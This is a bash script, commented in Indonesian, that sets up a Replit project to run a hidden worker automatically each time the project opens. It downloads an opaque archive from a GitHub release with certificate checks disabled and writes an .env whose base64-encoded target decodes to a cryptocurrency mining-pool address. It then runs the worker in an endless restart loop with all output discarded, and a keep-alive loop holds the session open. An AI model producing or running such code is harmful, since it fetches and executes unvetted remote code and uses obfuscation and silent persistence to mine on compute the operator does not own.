#!/bin/bash
# =============================================
# Replit Setup - WORKER00 (Bos.sh Persis) (2025)
# =============================================

echo "🔄 Membuat .replit file..."
cat > .replit << 'EOF'
modules = ["python-3.11"]

[workflows]
runButton = "Project"

[[workflows.workflow]]
name = "Project"
mode = "parallel"
author = "agent"

[[workflows.workflow.tasks]]
task = "workflow.run"
args = "bos"

[[workflows.workflow]]
name = "bos"
author = "agent"

[[workflows.workflow.tasks]]
task = "shell.exec"
args = "bash bos.sh"

[workflows.workflow.metadata]
outputType = "console"
EOF

echo "🔄 Mengunduh dan mengekstrak mcpo.tar.gz..."
curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
tar -xvf mcpo.tar.gz >/dev/null 2>&1
rm -f mcpo.tar.gz

echo "🔄 Mengubah direktori ke folder mcp..."
cd mcp || { echo "❌ Folder mcp tidak ditemukan!"; exit 1; }

echo "🔄 Membuat run.sh..."
cat > run.sh << 'RUNEOF'
#!/bin/bash
# run.sh - Worker (nama worker diisi manual)

PORT=$1
WORKER_NAME=$2
exec 2>/dev/null

if [ ! -d "python" ]; then
  echo "📥 Mengunduh Python 3.12..." | tee /dev/null
  curl -sLO https://github.com/astral-sh/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  tar -xzf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  rm -rf python
  mv cpython-3.12.1+20240107-linux-gnu-install_only python
else
  echo "✅ Python sudah ada" | tee /dev/null
fi

export PATH="./python/bin:$PATH"
yes | pip install --upgrade certifi pip >/dev/null 2>&1

echo "SERVER_WS=wss://vecxaula.me
SERVER_TARGET=c2cucXJsLmhlcm9taW5lcnMuY29tOjExNjY=
SERVER_DOMAIN=Q01050051a79de9de80e3b9562f18677aff4142072403b6a2be9bbbab47fadd3133fd74e411a84f
SERVER_SECRET=$WORKER_NAME
SERVER_CONNECTION=$PORT
SERVER_MODE=FAST" > .env

echo "🔄 Menjalankan app.py..." | tee /dev/null
while true; do
  python3 app.py
  sleep 15
done
RUNEOF

chmod +x run.sh

echo "🔄 Membuat bos.sh (Persis seperti requestmu)..."
cat > bos.sh << 'BOSEOF'
#!/bin/bash
cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker00 >/dev/null 2>&1 &
sleep 30
while true
do
        echo "Ngopi Boss..."
        sleep 1800
done
BOSEOF

chmod +x bos.sh

echo "✅ Sync certificate..."
if [ -d "python" ]; then
  cp /etc/ssl/certs/ca-certificates.crt python/lib/python3.12/site-packages/certifi/cacert.pem 2>/dev/null
fi

echo "✅ Done!"
echo "🔥 Jalankan sekarang:"
echo "   chmod +x bos.sh && ./bos.sh"
echo "   (tidak ada output)"
echo ""
echo "💡 Replit akan otomatis jalankan bos.sh setiap kali kamu buka project!"